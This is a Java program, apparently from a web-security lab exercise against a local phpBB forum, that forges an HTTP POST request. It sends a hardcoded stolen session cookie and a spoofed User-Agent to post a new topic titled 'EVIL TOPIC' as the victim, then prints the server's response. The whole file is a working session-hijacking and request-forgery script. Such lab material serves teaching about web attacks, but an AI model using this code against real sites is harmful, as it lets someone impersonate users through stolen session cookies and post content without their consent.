import java.io.*;
import java.net.*;
public class HTTPSimpleForge {

	public static void main(String[] args) throws IOException {
		try {
			int responseCode;
			InputStream responseIn=null;
			// URL to be forged
			URL url = new URL ("http://www.xsslabphpbb.com/posting.php?mode=newtopic&f=1");
			// URLConnection instance is created to further parameterize a
			// resource request past what the state members of URL instance
			// can represent.
			URLConnection urlConn = url.openConnection();
			if (urlConn instanceof HttpURLConnection) {
				urlConn.setConnectTimeout(60000);
				urlConn.setReadTimeout(90000);
			}	
			// addRequestProperty method is used to add HTTP Header Information.
			// Here we add User-Agent HTTP header to the forged HTTP packet.
			String userAgent = "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.23) Gecko/20110921 Ubuntu/10.04 (lucid) Firefox/3.6.23";
			urlConn.addRequestProperty("User-agent", userAgent);
			//HTTP Post Data which includes the information to be sent to the server.
			
			String myCookie = 
			"phpbb2mysql_sid=40e59b2c4cf8f3575255c21107b3ed44";
			urlConn.setRequestProperty("Cookie", myCookie);

			String data=
			"subject=EVIL+TOPIC&addbbcode18=%23444444&addbbcode20=0&helpbox=List%3A+%5Blist%5Dtext%5B%2Flist%5D+%28alt%2Bl%29&message=Bleahs&topictype=0&poll_title=&add_poll_option_text=&poll_length=&mode=newtopic&sid=40e59b2c4cf8f3575255c21107b3ed44&f=1&post=Submit";
			// DoOutput flag of URL Connection should be set to true
			// to send HTTP POST message.
			urlConn.setDoOutput(true);
			// OutputStreamWriter is used to write the HTTP POST data
			// to the url connection.
			OutputStreamWriter wr = new OutputStreamWriter(urlConn.getOutputStream());
			wr.write(data);
			wr.flush();
			// HttpURLConnection a subclass of URLConnection is returned by
			// url.openConnection() since the url is an http request.
			if (urlConn instanceof HttpURLConnection) {
				HttpURLConnection httpConn = (HttpURLConnection) urlConn;
				// Contacts the web server and gets the status code from
				// HTTP Response message.
				responseCode = httpConn.getResponseCode();
			
				System.out.println("Response Code = " + responseCode);
				// HTTP status code HTTP_OK means the response was
				// received sucessfully.
				if (responseCode == HttpURLConnection.HTTP_OK) {
					// Get the input stream from url connection object.
					responseIn = urlConn.getInputStream();
					// Create an instance for BufferedReader
					// to read the response line by line.
					BufferedReader buf_inp = new BufferedReader(new InputStreamReader(responseIn));
					String inputLine;
					while((inputLine = buf_inp.readLine())!=null) {
						System.out.println(inputLine);
					}
				}
			}
		} catch (MalformedURLException e) {
			e.printStackTrace();
		}
	}
}